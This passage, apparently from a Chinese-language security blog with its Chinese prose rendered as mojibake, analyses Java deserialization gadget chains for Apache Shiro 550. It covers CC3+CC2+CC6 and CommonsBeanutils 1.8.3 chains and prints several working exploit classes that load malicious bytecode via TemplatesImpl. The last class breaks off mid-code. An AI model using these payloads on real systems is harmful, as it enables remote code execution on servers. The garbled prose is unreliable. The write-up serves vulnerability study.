ä¹Ÿå°±æ¯”è¾ƒç®€å•äº†ï¼Œåªè¦ä¸å‡ºç°æ•°ç»„ç±»å°±è¡Œäº†</p><p><strong>Exp</strong>(CC3+CC2+CC6)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//CC3</span></span><br><span class="line">        TemplatesImpl templatesimpl=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class c=templatesimpl.getClass();</span><br><span class="line">        Field _nameField=c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templatesimpl,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field _byteCodesField=c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _byteCodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes= &#123;code&#125;;</span><br><span class="line">        _byteCodesField.set(templatesimpl,codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC2</span></span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC6</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,templatesimpl);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap2=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry,<span class="string">&quot;AAA&quot;</span>);</span><br><span class="line">        lazyMap.remove(templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åå°„ä¿®æ”¹LazyMapç±»çš„factoryå±æ€§</span></span><br><span class="line">        Class clazz=LazyMap.class;</span><br><span class="line">        Field factoryField= clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,invokerTransformer);</span><br><span class="line">        </span><br><span class="line">        serialize(hashMap2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201651857.png" alt="image-20221120165107805"></p><h3 id="CommonsBeanutils1-8-3æ— ä¾èµ–é“¾"><a href="#CommonsBeanutils1-8-3æ— ä¾èµ–é“¾" class="headerlink" title="CommonsBeanutils1.8.3æ— ä¾èµ–é“¾"></a>CommonsBeanutils1.8.3æ— ä¾èµ–é“¾</h3><p>ä¸ºä»€ä¹ˆå«æ— ä¾èµ–é“¾ï¼Ÿå› ä¸ºshiro550ä¸­è‡ªå¸¦äº†<code>CommonsBeanutils1.8.3</code></p><h4 id="ç®€ä»‹-1"><a href="#ç®€ä»‹-1" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>commons-beanutilsæ˜¯Apacheæä¾›çš„ä¸€ä¸ªç”¨äºæ“ä½œJAVA beançš„å·¥å…·åŒ…ã€‚é‡Œé¢æä¾›äº†å„ç§å„æ ·çš„å·¥å…·ç±»ï¼Œè®©æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿çš„å¯¹beanå¯¹è±¡çš„å±æ€§è¿›è¡Œå„ç§æ“ä½œã€‚</p><h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><p><strong>Person.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>TestBean</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Tom&quot;</span>,<span class="number">15</span>);</span><br><span class="line">        <span class="comment">//ä¸ä½¿ç”¨commons-beanutils</span></span><br><span class="line">        System.out.println(person.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä½¿ç”¨commons-beanutils</span></span><br><span class="line">        System.out.println(PropertyUtils.getProperty(person, <span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201714526.png" alt="image-20221120171422500"></p><p>å¯ä»¥å‘ç°ï¼Œé€šè¿‡<code>commons-beanutils</code>å¯ä»¥å®ç°åŠ¨æ€è°ƒç”¨æ–¹æ³•ï¼Œå¸¦æ¥ä¾¿æ·çš„åŒæ—¶ä¹Ÿå¸¦æ¥äº†å®‰å…¨é—®é¢˜</p><h4 id="åˆ©ç”¨é“¾åˆ†æ-1"><a href="#åˆ©ç”¨é“¾åˆ†æ-1" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h4><p>ä¸‹ä¸ªæ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ï¼Œè·Ÿè¿›<code>getProperty()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201716423.png" alt="image-20221120171613394"></p><p>å‘ç°åˆè°ƒç”¨äº†å¦ä¸€ä¸ª<code>getProperty()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201721160.png" alt="image-20221120172127135"></p><p>è·Ÿè¿›<code>getNestedProperty()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201722819.png" alt="image-20221120172201955"></p><p><code>getNestedProperty()</code>åœ¨è¿™é‡Œåšäº†ä¸€ä¸ªç±»ä¼¼swithçš„åˆ¤æ–­ï¼Œå¦‚æœæ˜¯mapçš„è¯å°±è°ƒmapï¼Œå¦‚æœæ˜¯ç´¢å¼•çš„è¯å°±è°ƒç´¢å¼•â€¦â€¦</p><p>å› ä¸ºæˆ‘ä»¬è¿™é‡Œå°±æ˜¯æœ€æ™®é€šçš„ä¸€ä¸ªbeanæ‰€ä»¥ï¼Œæœ€åä¼šè°ƒåˆ°<code>getSimpleProperty()</code></p><p>ç»§ç»­å¾€ä¸‹è·Ÿï¼Œçœ‹ä¸€ä¸‹<code>descriptor</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201728487.png" alt="image-20221120172849425"></p><p>è¿”å›äº†setï¼Œgetæ–¹æ³•ï¼ŒåŒæ—¶å°†æˆ‘ä»¬ä¼ å…¥çš„beançš„é¦–å­—æ¯è¿›è¡Œäº†å¤§å†™</p><p>å‘ä¸‹è·Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201732424.png" alt="image-20221120173212374"></p><p>è¿™é‡Œå­˜åœ¨ä¸€ä¸ªåå°„è°ƒç”¨ï¼Œè°ƒç”¨æµç¨‹ä¹Ÿå¾ˆæ¸…æ™°ï¼Œå¯¹æˆ‘ä»¬ä¼ é€’çš„å¯¹è±¡ï¼Œæ¥è°ƒç”¨ç¬¦åˆjavabeanæ ¼å¼çš„æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201733191.png" alt="image-20221120173315157"></p><p>åˆ©ç”¨ç‚¹ä¹Ÿåœ¨è¿™é‡Œ</p><p>åœ¨cc3ä¸­ï¼Œåˆ©ç”¨<code>TemplatesImpl.getOutputProperties()</code>ä¸‹çš„<code>newTransformer()</code>å®ç°äº†åŠ¨æ€ç±»çš„åŠ è½½</p><p>åœ¨cbé“¾ä¸­ï¼Œ<code>getOutputProperties()</code>å¯ä»¥çœ‹ä½œä¸€ä¸ªç¬¦åˆJavaBeanè§„èŒƒçš„æ–¹æ³•</p><p>æ‰€ä»¥ï¼Œåœ¨cbä¸­ï¼Œåªéœ€å¯¹TemplatesImplå¯¹è±¡è°ƒç”¨getOutputProperties()æ–¹æ³•å°±å¯ä»¥å®ç°åŠ¨æ€ç±»çš„åŠ è½½</p><p><strong>exp1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        PropertyUtils.getProperty(templates, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201746334.png" alt="image-20221120174653270"></p><p>ç°åœ¨åªéœ€è¦æ‰¾åˆ°è°ƒç”¨<code>getProperty()</code>çš„åœ°æ–¹å°±è¡Œäº†</p><p><code>BeanComparator.compare()</code>,å…¶ä¸­çš„propertyå±æ€§æ˜¯å¯æ§çš„ï¼Œo1,o2æ˜¯ä¼ å…¥çš„å‚æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201748709.png" alt="image-20221120174858675"></p><p>ç»§ç»­å‘ä¸Šæ‰¾è°ƒç”¨compareçš„åœ°æ–¹ï¼Œåœ¨cc2ä¸­å¯ä»¥ç”¨ä¼˜å…ˆé˜Ÿåˆ—æ¥æ‰¾åˆ°compareï¼Œæ‰€ä»¥è‡³æ­¤ï¼Œåˆ©ç”¨é“¾æ„é€ å®Œæ¯•</p><p><strong>Gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">BeanComparator.compare()</span><br><span class="line">PropertyUtils.getProperty()</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">defineClass-&gt;newInstance()</span><br></pre></td></tr></table></figure><p><strong>Exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC3</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CB</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC2</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;PriorityQueue&gt; c2 = PriorityQueue.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, beanComparator);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„å‡ ä¸ªç‚¹ï¼Œåœ¨æ„é€ çš„payloadä¸­æˆ‘ä»¬åˆ©ç”¨äº†<code>TransformingComparator</code>ç±»ï¼Œå¯æ˜¯<code>TransformingComparator</code>ç±»ä¸æ˜¯<code>CommonsColections4</code>ä¸­çš„ç±»å—ï¼ŸShiroä¸­æ˜¯ä¸å¸¦æœ‰cc4ä¾èµ–çš„</p><p>å…¶å®è¿™å°±æ¶‰åŠåˆ°äº†æ„é€ Expæ—¶çš„ä¸€ä¸ªæŠ€å·§ï¼Œåªè¦ä¿è¯åºåˆ—åŒ–æ—¶çš„ç±»æ˜¯ç¯å¢ƒä¸­å­˜åœ¨çš„ï¼Œä¹‹å‰æ€æ ·è°ƒç”¨éƒ½æ˜¯å¯ä»¥çš„</p><p>åœ¨Expé‡Œåé¢éƒ¨åˆ†é€šè¿‡åå°„ä¿®æ”¹äº†<code>PriorityQueue</code>ç±»çš„å€¼ä¸º<code>BeanComparator</code>ç±»ï¼Œæ‰€ä»¥åœ¨è¿›è¡Œåºåˆ—åŒ–æ—¶æ˜¯ä¸åŒ…å«<code>TransformingComparator</code>ç±»çš„</p><p>AESåŠ å¯†åæ‰§è¡Œï¼Œåˆå‡ºç°äº†æŠ¥é”™</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211202015688.png" alt="image-20221120201523642"></p><p>æ‰¾ä¸åˆ°<code>org.apache.commons.collections.comparators.ComparableComparator</code>ç±»</p><p>è¿™ä¸ªç±»ä¸æ˜¯cc3.2.1ä¸­çš„ç±»å—ï¼Œæˆ‘ä»¬åºåˆ—åŒ–çš„payloadä¸­æ˜¯ä¸åŒ…å«cc3.2.1ä¸­çš„ç±»çš„</p><p>å®é™…ä¸Šï¼Œé—®é¢˜å‡ºåœ¨<code>BeanComparator</code>,æ„é€ é“¾ä¸­æ‰€è°ƒç”¨çš„<code>BeanComparator</code>çš„æœ‰å‚æ„é€ ï¼Œè€Œå…¶æœ‰å‚æ„é€ å‡½æ•°é‡Œè°ƒç”¨äº†ComparableComparator</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211202022513.png" alt="image-20221120202206482"></p><p>è€ŒComparableComparatoræ˜¯cc3.2.1ä¸­çš„ï¼Œè§£å†³æ–¹æ³•ä¹Ÿéå¸¸ç®€å•ï¼Œè°ƒç”¨<code>BeanComparator</code>ç±»çš„å¦ä¸€ä¸ªæœ‰å‚å‡½æ•°ï¼Œè¯¥æ„é€ å‡½æ•°å…è®¸è‡ªå·±ä¼ å…¥ä¸€ä¸ªcomparatorï¼Œé‚£ä¼ å…¥ä¸€ä¸ªcbæˆ–è€…jdké‡Œé¢æœ‰çš„comparatorå°±è¡Œäº†</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211202024328.png" alt="image-20221120202402300"></p><p>æ‰¾è¿™ä¸ªcomparatorä¹Ÿæ˜¯ååˆ†å¥½æ‰¾çš„ï¼Œå› ä¸ºè¦è¿›è¡Œååºåˆ—åŒ–ï¼Œæ‰€ä»¥è¦æ‰¾ä¸€ä¸ªç»§æ‰¿serializeæ¥å£çš„ï¼ŒåŒæ—¶ç»§æ‰¿Comparatoræ¥å£çš„ã€‚</p><p>æœ‰å¾ˆå¤šè¿™æ ·çš„comparatorï¼Œè¿™é‡Œå°±ç”¨<code>AttrCompare.compare()</code>å°±è¡Œäº†</p><p><strong>Exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span 